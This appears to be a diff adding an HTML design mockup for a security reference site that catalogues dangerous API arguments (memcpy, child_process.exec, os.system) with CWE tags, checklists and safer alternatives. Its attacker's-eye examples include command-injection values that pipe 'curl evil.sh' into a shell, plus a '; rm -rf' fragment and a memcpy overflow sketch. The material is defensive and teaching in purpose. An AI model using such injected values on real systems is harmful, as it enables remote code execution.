+        <div class="sechead"><div><h2>Or by language.</h2><p>Coverage spans four ecosystems — the standard libraries and the packages that matter.</p></div></div>
+        <div class="langrow">
+          <a class="langtile" href="#"><div class="lt"><span class="lname">C</span><span class="lcount">380</span></div><div class="bar"><span style="width:73%"></span></div><div class="lpk">string.h · stdlib · stdio — memory &amp; format sinks</div></a>
+          <a class="langtile" href="#"><div class="lt"><span class="lname">JavaScript</span><span class="lcount">520</span></div><div class="bar"><span style="width:100%"></span></div><div class="lpk">child_process · fs · pg · lodash · express</div></a>
+          <a class="langtile" href="#"><div class="lt"><span class="lname">Python</span><span class="lcount">410</span></div><div class="bar"><span style="width:79%"></span></div><div class="lpk">os · subprocess · pickle · sqlite3 · yaml</div></a>
+          <a class="langtile" href="#"><div class="lt"><span class="lname">TypeScript</span><span class="lcount">139</span></div><div class="bar"><span style="width:27%"></span></div><div class="lpk">typed overlays on the JS ecosystem</div></a>
+        </div>
+      </div>
+
+      <!-- demo: how a record reads -->
+      <div class="demoband">
+        <div class="head">
+          <div><h2>How a record reads.</h2><p>Every page — even the ones no human wrote up — leads with the answer, then an argument map, the weakness, an attacker's-eye failure, and a reviewer's checklist. All derived from the model facts.</p></div>
+          <button class="txtlink" data-goto="raw">Open the full record →</button>
+        </div>
+        <div class="minicard" style="max-width:660px">
+          <div class="mc-top"><span class="risk-stripe"></span>
+            <div><div class="mc-sym">memcpy</div><div class="mc-env">c · &lt;string.h&gt; · standard library</div></div>
+            <span class="roletag r-sink">sink</span>
+          </div>
+          <div class="mc-body">
+            <p class="mc-answer">Copies a caller-chosen number of bytes into the destination buffer. If that count comes from untrusted input and the destination is fixed-size, the copy runs past its end.</p>
+            <div class="mc-slot">void *memcpy(void *dest, const void *src, <span class="watched">size_t n</span>)
+<span class="note">▲ Atropos watches Argument[2] — n, the byte count → CWE-787</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- the seam / funnel -->
+      <div class="seamsec">
+        <div class="sechead"><div><h2>Two questions. Two tools.</h2><p>The reason this reference is free: it does one half of the job precisely, and hands you the engine for the other half.</p></div></div>
+        <div class="seam">
+          <div class="seampanel atr">
+            <span class="sp-tag">Atropos · this site</span>
+            <h3>Names the boundary.</h3>
+            <div class="sp-sub">A declarative fact about the API itself.</div>
+            <ul>
+              <li><span class="mk">→</span> Which argument is dangerous, and why.</li>
+              <li><span class="mk">→</span> The weakness class and its CWE.</li>
+              <li><span class="mk">→</span> How it's abused, and what to check.</li>
+            </ul>
+            <div class="sp-foot">Same for every one of 1,449 symbols.</div>
+          </div>
+          <div class="seamarrow">→</div>
+          <div class="seampanel lac">
+            <span class="sp-tag">Lachesis · the engine</span>
+            <h3>Judges the flow.</h3>
+            <div class="sp-sub">A verdict about your specific code.</div>
+            <ul>
+              <li><span class="mk">→</span> Does untrusted data reach that argument?</li>
+              <li><span class="mk">→</span> Is a guard already dominating the call?</li>
+              <li><span class="mk">→</span> Is this call, in your repo, a real bug?</li>
+            </ul>
+            <div class="sp-foot">Continue any symbol → <a href="#">Trace it in Lachesis</a></div>
+          </div>
+        </div>
+        <p class="seamnote">Atropos never says “this is a bug” — by design. A fact can name the argument to watch; only a flow through <i>your</i> codebase can decide if it's reachable. That boundary is exactly where the reference ends and the engine begins.</p>
+      </div>
+
+      <!-- ecosystem footer -->
+      <div class="ecofoot">
+        <div class="ep">
+          <a href="#"><b>Observatory</b><span>the model boundary — you're here</span></a>
+          <a class="ext" href="#"><b>Casefiles</b><span>the boundary inside real CVEs</span></a>
+          <a class="ext" href="#"><b>Lachesis</b><span>the boundary through a codebase</span></a>
+        </div>
+        <a class="src ext" href="#">Inspect the source model</a>
+      </div>
+    </div>
+  </div>
+  <div class="notes"><div class="notes-inner">
+    <h4>What the home page now does</h4>
+    <div class="grid">
+      <div class="n"><div class="t">Search intent up top</div><div class="d">The headline is <b>the question people type</b>, with the search field and the Atropos→Lachesis thesis above the fold.</div></div>
+      <div class="n"><div class="t">An entry for people without a symbol</div><div class="d">Most visitors don't arrive knowing “memcpy.” <b>Browse by weakness</b> lets them start from the risk they care about — organized the way a field manual should be, by danger.</div></div>
+      <div class="n"><div class="t">Breadth is now felt</div><div class="d">The weakness grid (counts + languages) and the four language tiles make <b>1,449 symbols across 4 ecosystems</b> tangible, instead of one lonely demo card.</div></div>
+      <div class="n"><div class="t">The demo still proves the value</div><div class="d">One real derived record shows what every page delivers — kept, but no longer the whole page.</div></div>
+      <div class="n"><div class="t">The seam is made concrete</div><div class="d">A two-panel split spells out <b>what Atropos answers vs. what Lachesis answers</b> — the strategic reason the data is free and the funnel exists.</div></div>
+      <div class="n"><div class="t">All figures are derived</div><div class="d">Weakness counts, language splits, and CWE tags are aggregations over the pack — no hand-curation, so the home page stays true as the catalog grows.</div></div>
+    </div>
+  </div></div>
+</section>
+
+<!-- ================= SYMBOL · RAW ================= -->
+<section class="screen" data-screen="raw" hidden>
+  <div class="frame"><div class="wrap">
+    <div class="crumb"><a href="#">Observatory</a> / <a href="#">C</a> / <a href="#">memory</a> / <b>memcpy</b></div>
+    <div class="sym-head"><span class="stripe"></span>
+      <div class="sym-title"><h1>memcpy</h1><div class="sym-sub">c · &lt;string.h&gt; · standard library · arity 3</div></div>
+      <div class="sym-badges"><span class="roletag r-sink">sink</span><span class="tier">Derived from model facts</span></div>
+    </div>
+
+    <div class="factstrip">
+      <div class="f"><span class="fl">Role</span><span class="fv red">Sink</span></div>
+      <div class="f"><span class="fl">Weakness</span><span class="fv red">CWE-787 · 120</span></div>
+      <div class="f"><span class="fl">Watches</span><span class="fv">Argument[2] · n</span></div>
+      <div class="f"><span class="fl">Kind</span><span class="fv">buffer-size</span></div>
+      <div class="f"><span class="fl">Confidence</span><span class="fv">high</span></div>
+      <div class="f"><span class="fl">Corroboration</span><span class="fv">3 sources</span></div>
+    </div>
+
+    <div class="detail">
+      <article>
+        <p class="answer" style="margin-top:22px">Copies a caller-chosen number of bytes into the destination buffer. If that byte count is <span class="em">attacker-influenced</span> and the destination is a fixed-size buffer, the write runs past the end of it — a classic buffer overflow.</p>
+
+        <div class="sec">
+          <span class="microlab">Argument map · what each slot does</span>
+          <div class="sig">void *memcpy(void *dest, const void *src, <span class="watched">size_t n</span>)</div>
+          <table class="argtbl">
+            <thead><tr><th>Arg</th><th>Access path</th><th>Purpose</th><th>Watched</th></tr></thead>
+            <tbody>
+              <tr><td class="an">dest</td><td class="ap">Argument[0]</td><td class="why">Destination buffer the bytes are written into.</td><td><span class="flag no">— no</span></td></tr>
+              <tr><td class="an">src</td><td class="ap">Argument[1]</td><td class="why">Source the bytes are read from.</td><td><span class="flag no">— no</span></td></tr>
+              <tr class="hot"><td class="an">n</td><td class="ap">Argument[2]</td><td class="why">Number of bytes copied — the overflow lever. If <code>n</code> exceeds the real size of <code>dest</code>, the write spills past it.</td><td><span class="flag yes">▲ sink</span></td></tr>
+            </tbody>
+          </table>
+          <p class="sec-note" style="margin-top:10px">Only the size argument carries the fact. The pointers aren't flagged — the danger is the <i>count</i>, not the buffers.</p>
+        </div>
+
+        <div class="sec">
+          <span class="microlab n">The weakness</span>
+          <div class="cwecards">
+            <div class="cwecard"><a class="cid" href="#">CWE-787 ↗</a><div class="cname">Out-of-bounds Write</div><p>The product writes data past the end, or before the beginning, of the intended buffer — corrupting adjacent memory.</p></div>
+            <div class="cwecard"><a class="cid" href="#">CWE-120 ↗</a><div class="cname">Classic Buffer Overflow</div><p>Copies an input buffer to an output buffer without verifying the input is smaller than the destination.</p></div>
+          </div>
+        </div>
+
+        <div class="sec">
+          <span class="microlab">What goes wrong</span>
+          <div class="attacker">
+            <div class="ah">Attacker's-eye view</div>
+            <div class="ab">
+              <p>If the attacker controls <code>n</code>, they pass a length larger than <code>dest</code>. The copy overruns the buffer and overwrites whatever sits after it — a saved return address, a function pointer, heap metadata — turning a copy into memory corruption or code execution.</p>
+              <div class="demo"><span class="cm">// dest is a 64-byte stack buffer</span>
+char dest[64];
+<span class="cm">// n comes from a length field in a network packet</span>
+memcpy(dest, packet.body, <span class="in">packet.len</span>);   <span class="cm">// len = 4096 → 4KB written into 64 bytes</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="sec">
+          <span class="microlab n">To decide if this call is a bug, check</span>
+          <div class="checklist">
+            <div class="ci"><span class="num">1</span><span class="ct">Does <code>n</code> derive from <b>untrusted input</b> — a network read, a file, <code>argv</code>, an env var?</span></div>
+            <div class="ci"><span class="num">2</span><span class="ct">Is <code>dest</code> a <b>fixed-size</b> or smaller-than-<code>n</code> allocation?</span></div>
+            <div class="ci"><span class="num">3</span><span class="ct">Is there a bounds check — <code>n &lt;= sizeof(dest)</code> — that <b>dominates</b> this call on every path?</span></div>
+            <div class="verdict">If <b>1</b> and <b>2</b> hold and <b>3</b> is missing on any path, this is a probable out-of-bounds write. Steps 1 and 3 are reachability/guard questions a lookup can't answer — that's the handoff below.</div>
+          </div>
+        </div>
+
+        <div class="handoff">
+          <div class="hh"><span>Is this a bug in your code?</span><span class="r">Atropos stops here — by design</span></div>
+          <div class="hb">
+            <p class="stop">Atropos tells you <b>Argument[2] is a buffer-size sink</b>. It does <b>not</b> tell you whether untrusted data reaches <code>n</code> here, or whether a bound already guards it.</p>
+            <p class="cross">Those are <b>reachability</b> questions about your codebase — steps 1 and 3 above. Lachesis traces the flow and the dominating guards.</p>
+            <a class="cta" href="#">Check this call in Lachesis <span class="arr">→</span></a>
+          </div>
+        </div>
+
+        <div class="family">
+          <span class="microlab n" style="display:block;margin-bottom:14px">The family · buffer-size / CWE-787</span>
+          <div class="famgrid">
+            <div class="famcol"><h3>Same weakness</h3>
+              <a href="#"><span class="dot">●</span> memmove <span class="lg">c</span></a>
+              <a href="#"><span class="dot">●</span> strcpy <span class="lg">c</span></a>
+              <a href="#"><span class="dot">●</span> strncpy <span class="lg">c</span></a>
+              <a href="#"><span class="dot">●</span> sprintf <span class="lg">c</span></a>
+            </div>
+            <div class="famcol"><h3>Across languages</h3>
+              <a href="#"><span class="dot">●</span> Buffer.copy <span class="lg">js</span></a>
+              <a href="#"><span class="dot">●</span> ctypes.memmove <span class="lg">py</span></a>
+              <a href="#"><span class="dot">●</span> copyWithin <span class="lg">ts</span></a>
+            </div>
+            <div class="famcol san"><h3>What neutralizes it</h3>
+              <a href="#"><span class="dot">●</span> bounds check (guard) <span class="lg">—</span></a>
+              <a href="#"><span class="dot">●</span> snprintf <span class="lg">c</span></a>
+              <p style="font-size:12px;color:var(--muted);margin:8px 0 0">No sanitizer function fixes this — a dominating length check does.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="fold">
+          <div class="fold-lab">Model facts · verbatim from the pack</div>
+          <table class="facts">
+            <thead><tr><th>Role</th><th>Kind</th><th>Access path</th><th>Model ID</th><th>Confidence</th></tr></thead>
+            <tbody><tr><td><span class="roletag r-sink" style="border:0;padding:0">sink</span></td><td>buffer-size</td><td><code>Argument[2]</code></td><td><code>c.std.memcpy.a2</code></td><td class="conf">high · corrob. 3</td></tr></tbody>
+          </table>
+        </div>
+      </article>
+
+      <aside>
+        <div class="as-lab">Symbol record</div>
+        <dl>
+          <div class="row"><dt>Language</dt><dd>C</dd></div>
+          <div class="row"><dt>Header</dt><dd>&lt;string.h&gt;</dd></div>
+          <div class="row"><dt>Arity</dt><dd>3</dd></div>
+          <div class="row"><dt>Facts</dt><dd>1</dd></div>
+          <div class="row"><dt>CWE</dt><dd>787, 120</dd></div>
+          <div class="row"><dt>Ingested rev</dt><dd class="git">a3f9c1d2</dd></div>
+        </dl>
+        <a class="srcbtn" href="#">Open exact source at this revision</a>
+        <div class="refbox"><div class="microlab n" style="margin-bottom:6px">References</div>
+          <a href="#">cppreference.com/w/c/string/byte/memcpy ↗</a>
+          <a href="#">cwe.mitre.org/data/definitions/787 ↗</a>
+        </div>
+      </aside>
+    </div>
+  </div></div>
+
+  <div class="notes"><div class="notes-inner">
+    <h4>How this stops being “thin” — without hand-writing 1,449 pages</h4>
+    <div class="grid">
+      <div class="n"><div class="t">Six derived sections, one fact</div><div class="d">From a single row (<code>c.std.memcpy.a2</code>) the page builds a <b>fact strip, argument map, weakness explainer, attack sketch, checklist, and family</b>. Density comes from <i>using</i> the fields, not adding prose.</div></div>
+      <div class="n"><div class="t">Templated per-KIND, not per-symbol</div><div class="d">The attack sketch and checklist are written once for <code>buffer-size</code> and inherited by <b>every</b> buffer-size sink. 32 kind templates cover all 1,449 symbols — that's the scaling trick.</div></div>
+      <div class="n"><div class="t">CWE text is free public data</div><div class="d">The weakness names + one-liners come from MITRE's CWE list — a finite lookup, so every page gets a real explainer, not just a number.</div></div>
+      <div class="n"><div class="t">The family is real cross-linking</div><div class="d">Same-kind siblings, cross-language equivalents, and the sanitizer/guard that neutralizes the kind — all derived from the catalog by <code>kind</code>+<code>role</code>. No competitor keys on the symbol like this.</div></div>
+      <div class="n"><div class="t">Everything still funnels</div><div class="d">The checklist's un-answerable steps (is it reachable? is it guarded?) <b>are</b> the Lachesis pitch — density and funnel are the same move.</div></div>
+    </div>
+  </div></div>
+</section>
+
+<!-- ================= SYMBOL · REVIEWED ================= -->
+<section class="screen" data-screen="reviewed" hidden>
+  <div class="frame"><div class="wrap">
+    <div class="crumb"><a href="#">Observatory</a> / <a href="#">JavaScript</a> / <a href="#">child_process</a> / <b>exec</b></div>
+    <div class="sym-head"><span class="stripe"></span>
+      <div class="sym-title"><h1>child_process.exec</h1><div class="sym-sub">javascript · node:child_process · arity 3</div></div>
+      <div class="sym-badges"><span class="roletag r-sink">sink</span><span class="tier reviewed">✓ Human-reviewed · 2026-09-04</span></div>
+    </div>
+
+    <div class="factstrip">
+      <div class="f"><span class="fl">Role</span><span class="fv red">Sink</span></div>
+      <div class="f"><span class="fl">Weakness</span><span class="fv red">CWE-78</span></div>
+      <div class="f"><span class="fl">Watches</span><span class="fv">Argument[0] · command</span></div>
+      <div class="f"><span class="fl">Kind</span><span class="fv">command-injection</span></div>
+      <div class="f"><span class="fl">Confidence</span><span class="fv">high</span></div>
+      <div class="f"><span class="fl">Sanitizer</span><span class="fv blue">shell-quote</span></div>
+    </div>
+
+    <div class="detail">
+      <article>
+        <p class="answer" style="margin-top:22px">Runs a command string through the host shell. Any <span class="em">attacker-controlled</span> substring in that string can break out and become its own shell command — <code>; rm -rf</code>, a backtick, a pipe.</p>
+
+        <div class="sec">
+          <span class="microlab">Argument map · what each slot does</span>
+          <div class="sig">child_process.exec(<span class="watched">command</span>, options?, callback?)</div>
+          <table class="argtbl">
+            <thead><tr><th>Arg</th><th>Access path</th><th>Purpose</th><th>Watched</th></tr></thead>
+            <tbody>
+              <tr class="hot"><td class="an">command</td><td class="ap">Argument[0]</td><td class="why">Full command line, passed to <code>/bin/sh -c</code>. Shell metacharacters in it are <b>interpreted</b>, not escaped.</td><td><span class="flag yes">▲ sink</span></td></tr>
+              <tr><td class="an">options</td><td class="ap">Argument[1]</td><td class="why">cwd, env, timeout, shell selection.</td><td><span class="flag no">— no</span></td></tr>
+              <tr><td class="an">callback</td><td class="ap">Argument[2]</td><td class="why">Receives (error, stdout, stderr).</td><td><span class="flag no">— no</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="sec">
+          <span class="microlab n">The weakness</span>
+          <div class="cwecards" style="grid-template-columns:1fr">
+            <div class="cwecard"><a class="cid" href="#">CWE-78 ↗</a><div class="cname">OS Command Injection</div><p>The product builds an OS command from external input without neutralizing special elements, so the input can alter the command that runs.</p></div>
+          </div>
+        </div>
+
+        <div class="sec">
+          <span class="microlab">What goes wrong</span>
+          <div class="attacker">
+            <div class="ah">Attacker's-eye view</div>
+            <div class="ab">
+              <p>Any attacker-controlled substring of <code>command</code> can inject its own command with the app's privileges — a semicolon, a pipe, or a backtick ends the intended command and starts theirs.</p>
+              <div class="demo"><span class="cm">// filename is user-supplied</span>
+exec(`convert ${<span class="in">filename</span>} out.png`)
+<span class="cm">// filename = "x.png; curl evil.sh | sh"</span>
+<span class="cm">//   → convert runs, then the injected download runs too</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="sec">
+          <span class="microlab n">To decide if this call is a bug, check</span>
+          <div class="checklist">
+            <div class="ci"><span class="num">1</span><span class="ct">Does any part of <code>command</code> come from <b>untrusted input</b>?</span></div>
+            <div class="ci"><span class="num">2</span><span class="ct">Is the string built by <b>concatenation or a template</b> rather than a fixed literal?</span></div>
+            <div class="ci"><span class="num">3</span><span class="ct">Is the untrusted part passed through a <b>shell escape</b> (<code>shell-quote</code>) — or better, an argument-array API?</span></div>
+            <div class="verdict">If <b>1</b> and <b>2</b> hold and <b>3</b> is absent, this is a probable command injection. The safer shape is below; reachability of step 1 is the handoff.</div>
+          </div>
+        </div>
+
+        <div class="handoff">
+          <div class="hh"><span>Is this a bug in your code?</span><span class="r">Atropos stops here — by design</span></div>
+          <div class="hb">
+            <p class="stop">Atropos tells you <b>Argument[0] is a command-injection sink</b>. It does <b>not</b> know whether the string you pass is attacker-controlled.</p>
+            <p class="cross">Does untrusted input flow into <code>command</code> here, unsanitized? Trace it with Lachesis across your codebase.</p>
+            <a class="cta" href="#">Check this call in Lachesis <span class="arr">→</span></a>
+          </div>
+        </div>
+
+        <div class="review">
+          <h2>Reviewed guidance</h2>
+          <div class="rl">Human-checked overlay · applies to node:child_process · reviewed 2026-09-04</div>
+          <div class="safer"><span class="microlab">Safer direction</span>
+            <p>Prefer an argument-array API with a fixed executable and no shell: <code>execFile('convert', [filename, 'out.png'], {shell:false})</code>. The arguments never touch a shell, so metacharacters stay inert.</p>
+          </div>
+          <div class="codegrid">
+            <div><span class="microlab">Unsafe shape</span>
+              <div class="code bad"><span class="cmt">// filename is user input</span>
+exec(`convert ${filename} out.png`)
+<span class="cmt">// filename = "x; curl evil|sh"</span>
+<span class="cmt">//   → runs the injected command</span></div>
+            </div>
+            <div><span class="microlab" style="color:var(--sanitizer)">Safer shape</span>
+              <div class="code good">execFile(
+  'convert',
+  [filename, 'out.png'],
+  { shell: false }
+)  <span class="cmt">// filename is one arg</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="family">
+          <span class="microlab n" style="display:block;margin-bottom:14px">The family · command-injection / CWE-78</span>
+          <div class="famgrid">
+            <div class="famcol"><h3>Same weakness</h3>
+              <a href="#"><span class="dot">●</span> execSync <span class="lg">js</span></a>
+              <a href="#"><span class="dot">●</span> spawn(shell:true) <span class="lg">js</span></a>
+              <a href="#"><span class="dot">●</span> os.system <span class="lg">py</span></a>
+              <a href="#"><span class="dot">●</span> system <span class="lg">c</span></a>
+            </div>
+            <div class="famcol"><h3>Across languages</h3>
+              <a href="#"><span class="dot">●</span> subprocess.run <span class="lg">py</span></a>
+              <a href="#"><span class="dot">●</span> popen <span class="lg">c</span></a>
+              <a href="#"><span class="dot">●</span> Runtime.exec <span class="lg">jvm</span></a>
+            </div>
+            <div class="famcol san"><h3>What neutralizes it</h3>
+              <a href="#"><span class="dot">●</span> shell-quote.quote <span class="lg">js</span></a>
+              <a href="#"><span class="dot">●</span> shlex.quote <span class="lg">py</span></a>
+              <a href="#"><span class="dot">●</span> execFile (no shell) <span class="lg">js</span></a>
+            </div>
+          </div>
+        </div>
+
+        <div class="fold">
+          <div class="fold-lab">Model facts · verbatim from the pack</div>
+          <table class="facts">
+            <thead><tr><th>Role</th><th>Kind</th><th>Access path</th><th>Model ID</th><th>Confidence</th></tr></thead>
+            <tbody><tr><td><span class="roletag r-sink" style="border:0;padding:0">sink</span></td><td>command-injection</td><td><code>Argument[0]</code></td><td><code>javascript.childprocess.exec.a0</code></td><td class="conf">high · corrob. 3</td></tr></tbody>
+          </table>
+        </div>
+      </article>
+
+      <aside>
+        <div class="as-lab">Symbol record</div>
+        <dl>
+          <div class="row"><dt>Language</dt><dd>JavaScript</dd></div>
+          <div class="row"><dt>Package</dt><dd>child_process</dd></div>
+          <div class="row"><dt>Arity</dt><dd>3</dd></div>
+          <div class="row"><dt>Facts</dt><dd>1</dd></div>
+          <div class="row"><dt>CWE</dt><dd>78</dd></div>
+          <div class="row"><dt>Ingested rev</dt><dd class="git">a3f9c1d2</dd></div>
+        </dl>
+        <a class="srcbtn" href="#">Open exact source at this revision</a>
+        <div class="refbox"><div class="microlab n" style="margin-bottom:6px">References</div>
+          <a href="#">nodejs.org/api/child_process ↗</a>
+          <a href="#">cwe.mitre.org/data/definitions/78 ↗</a>
+        </div>
+      </aside>
+    </div>
+  </div></div>
+
+  <div class="notes"><div class="notes-inner">
+    <h4>Reviewed = the same dense page, one tier richer</h4>
+    <div class="grid">
+      <div class="n"><div class="t">Identical skeleton</div><div class="d">Strip → answer → argument map → weakness → attack → checklist → <b>handoff</b> → family → facts. Reviewed <b>inserts</b> a “Reviewed guidance” band (safer direction + code) after the handoff — it doesn't replace the derived spine.</div></div>
+      <div class="n"><div class="t">Confidence, not theatre</div><div class="d">The green human-reviewed mark is a quiet graded signal — the opposite of the old red “Model fact only” disclaimer that made 98% of pages look broken.</div></div>
+      <div class="n"><div class="t">Real code, both shapes</div><div class="d">The unsafe/safe grid uses the pack's actual editorial content (<code>exec</code> vs <code>execFile</code>).</div></div>
+      <div class="n"><div class="t">The sanitizer is linked</div><div class="d">This kind <i>has</i> a real sanitizer record (<code>shell-quote</code>) — so the family's “what neutralizes it” column is concrete, not a guard note.</div></div>
+    </div>
+  </div></div>
+</section>
+
+<!-- ================= SEARCH ================= -->
+<section class="screen" data-screen="search" hidden>
+  <div class="frame"><div class="wrap searchpage">
+    <span class="kicker neutral">Search</span>
+    <h2 style="font-size:22px;margin:8px 0 18px">Results for <code style="font-size:18px">query</code></h2>
+    <div class="bigsearch"><span class="mag" style="color:var(--muted);font-family:var(--mono)">⌕</span><input value="query" aria-label="Search" spellcheck="false"></div>
+    <div class="resmeta">6 symbols · sinks first · grouped by weakness</div>
+    <div class="reslist">
+      <a class="resrow" href="#" data-goto="reviewed"><span class="rsym">mysql_query</span><span class="renv">php · mysql</span><span class="rans">Argument[0] is a SQL-injection sink — the query string. CWE-89.</span><span class="rtag"><span class="roletag r-sink">sink</span></span></a>
+      <a class="resrow" href="#"><span class="rsym">Cursor.execute</span><span class="renv">python · sqlite3</span><span class="rans">Argument[0] is a SQL-injection sink when built by string formatting.</span><span class="rtag"><span class="roletag r-sink">sink</span></span></a>
+      <a class="resrow" href="#"><span class="rsym">db.query</span><span class="renv">javascript · pg</span><span class="rans">Argument[0] is a SQL-injection sink; use parameterized values.</span><span class="rtag"><span class="roletag r-sink">sink</span></span></a>
+      <a class="resrow" href="#"><span class="rsym">escape</span><span class="renv">python · pymysql</span><span class="rans">Receiver → ReturnValue sanitizer for SQL string values.</span><span class="rtag"><span class="roletag r-sanitizer">sanitizer</span></span></a>
+    </div>
+    <div class="missing">
+      <span class="kicker">Not in Atropos</span>
+      <h2>No model for <span class="q">sequelize.query</span></h2>
+      <p>This exact symbol isn't in the pack yet. That's not a verdict of “safe” — it means no one has curated a fact for it. Here's what you can still do.</p>
+      <div class="opts">
+        <div class="opt"><h3>Nearest modeled symbols</h3><p><code>db.query</code> (pg), <code>Cursor.execute</code> (sqlite3) — same weakness, likely the same watched argument.</p></div>
+        <div class="opt fn"><h3>Lachesis analyzes it anyway →</h3><p>An unmodeled call still flows through the graph structurally. Lachesis traces reachability even where Atropos has no fact yet.</p></div>
+        <div class="opt"><h3>Model it</h3><p>Know the dangerous argument? Draft a one-line fact and open a PR against the Atropos catalog.</p></div>
+        <div class="opt"><h3>Watch for coverage</h3><p>ORMs like Sequelize are on the roadmap. Pack version + revision are always shown, so staleness is visible.</p></div>
+      </div>
+    </div>
+  </div></div>
+  <div class="notes"><div class="notes-inner">
+    <h4>Two states the old app fumbled</h4>
+    <div class="grid">
+      <div class="n"><div class="t">Results answer, not just link</div><div class="d">Each row carries a <b>one-line answer + CWE</b>, so the list is scannable before you click.</div></div>
+      <div class="n"><div class="t">“Missing” ≠ “safe”</div><div class="d">The new missing state <b>explicitly separates</b> “not modeled” from “not dangerous.”</div></div>
+      <div class="n"><div class="t">Missing is a funnel moment</div><div class="d">No fact? <b>Lachesis still analyzes it</b> — the gap becomes a reason to reach for the engine.</div></div>
+      <div class="n"><div class="t">Contribution path</div><div class="d">“Model it” routes engaged users into the Atropos PR flow, kept secondary.</div></div>
+    </div>
+  </div></div>
+</section>
+
+<!-- ================= MOBILE ================= -->
+<section class="screen" data-screen="mobile" hidden>
+  <div class="frame"><div class="wrap">
+    <div class="mobwrap">
+      <div class="phone"><div class="p-in">
+        <div class="brand" style="font-size:13px;margin-bottom:14px"><span class="mark" style="width:22px;height:22px;font-size:10px">AO</span> Observatory</div>
+        <div class="sym-head" style="padding:6px 0 14px"><span class="stripe"></span>
+          <div class="sym-title"><h1 style="font-size:24px">os.system</h1><div class="sym-sub" style="font-size:12px">python · os · arity 1</div></div>
+        </div>
+        <div class="factstrip" style="margin-bottom:16px">
+          <div class="f" style="flex:1 1 46%;border-bottom:1px solid var(--rule);border-right:1px solid var(--rule)"><span class="fl">Role</span><span class="fv red">Sink</span></div>
+          <div class="f" style="flex:1 1 46%;border-bottom:1px solid var(--rule)"><span class="fl">Weakness</span><span class="fv red">CWE-78</span></div>
+          <div class="f" style="flex:1 1 46%;border-right:1px solid var(--rule)"><span class="fl">Watches</span><span class="fv">Arg[0]</span></div>
+          <div class="f" style="flex:1 1 46%"><span class="fl">Kind</span><span class="fv">cmd-inject</span></div>
+        </div>
+        <p class="answer" style="font-size:17px">Runs a string through the shell. <span class="em">Untrusted</span> text in it becomes shell commands.</p>
+        <div class="sec" style="margin-top:16px"><span class="microlab">Watched slot</span>
+          <div class="sig" style="font-size:13px;margin-top:10px">os.system(<span class="watched">command</span>)</div>
+          <p class="sec-note" style="margin-top:8px;font-size:12.5px"><b>Argument[0]</b> — passed to <code>/bin/sh</code>.</p>
+        </div>
+        <div class="sec" style="margin-top:18px"><span class="microlab">What goes wrong</span>
+          <div class="attacker" style="margin-top:10px"><div class="ah">Attacker's-eye view</div>
+            <div class="ab" style="padding:12px 14px"><p style="font-size:14px">A <code>;</code> or <code>|</code> in the input ends the intended command and starts the attacker's.</p></div>
+          </div>
+        </div>
+        <div class="handoff" style="margin-top:18px"><div class="hh" style="font-size:10px"><span>A bug in your code?</span></div>
+          <div class="hb" style="padding:14px"><p class="stop" style="font-size:15px">Atropos says <b>this arg is a sink</b>. It can't see if your input is attacker-controlled.</p>
+            <a class="cta" href="#" style="margin-top:12px;width:100%;justify-content:center">Trace it in Lachesis →</a>
+          </div>
+        </div>
+      </div></div>
+      <div class="mobexplain">
+        <span class="kicker neutral">Mobile</span>
+        <h3>Dense, but task-ordered — not a squished desktop.</h3>
+        <ul>
+          <li><b>The fact strip wraps to a 2×2 grid</b> so the at-a-glance data survives on a phone instead of scrolling off.</li>
+          <li><b>Same order of operations.</b> Strip → answer → watched slot → attack → handoff. Nothing important is deferred to a desktop-only column.</li>
+          <li><b>Heavy sections collapse, not vanish.</b> The argument map and family become tap-to-expand; the spine stays visible.</li>
+          <li><b>Signatures and code scroll in their own box</b> (<code>overflow-x</code>), so the page body never scrolls sideways.</li>
+          <li><b>The handoff CTA goes full-width</b> — the one action the page wants is thumb-sized.</li>
+        </ul>
+      </div>
+    </div>
+  </div></div>
+</section>
+
+<script>
+  const screens=[...document.querySelectorAll('.screen')];
+  const btns=[...document.querySelectorAll('.segs button')];
+  function show(name){
+    screens.forEach(s=>s.hidden=s.dataset.screen!==name);
+    btns.forEach(b=>b.setAttribute('aria-current',String(b.dataset.s===name)));
+    window.scrollTo({top:0});
+  }
+  btns.forEach(b=>b.addEventListener('click',()=>show(b.dataset.s)));
+  document.querySelectorAll('[data-goto]').forEach(el=>el.addEventListener('click',e=>{e.preventDefault();show(el.dataset.goto);}));
+</script>
